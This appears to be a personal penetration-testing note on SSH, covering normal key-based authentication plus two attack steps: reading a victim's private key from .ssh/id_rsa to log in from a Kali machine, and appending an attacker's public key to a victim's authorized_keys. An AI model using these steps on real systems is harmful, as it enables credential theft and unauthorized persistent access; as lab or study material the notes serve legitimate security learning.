---
creation date: December 19th 2022
last modified date: December 19th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[SSH]]  
___

## Description:  

### Setting up key based auth
https://www.digitalocean.com/community/tutorials/how-to-configure-ssh-key-based-authentication-on-a-linux-server
```
ssh-keygen -t rsa

put the public key in the users home folder:

mkdir -p ~/.ssh

chmod 700 ~/.ssh

cat id_rsa.pub >> ~/.ssh/authorized_keys

ssh -i <private key filename> user@10.10.10.10
```

### Gaining SSH access with read access
```
On victim:

cat .ssh/id_rsa

*copy and paste the id_rsa locally

On kali:

gedit id_rsa

*paste

chmod 600 id_rsa

ssh -i id_rsa user@ip_or_hostname
```

### Gaining SSH access with write access
```
ssh-keygen -t rsa

put the public key in the users home folder:

mkdir -p ~/.ssh

chmod 700 ~/.ssh

cat id_rsa.pub >> ~/.ssh/authorized_keys

ssh -i <private key filename> user@10.10.10.10
```

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 19th 2022 (02:43 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
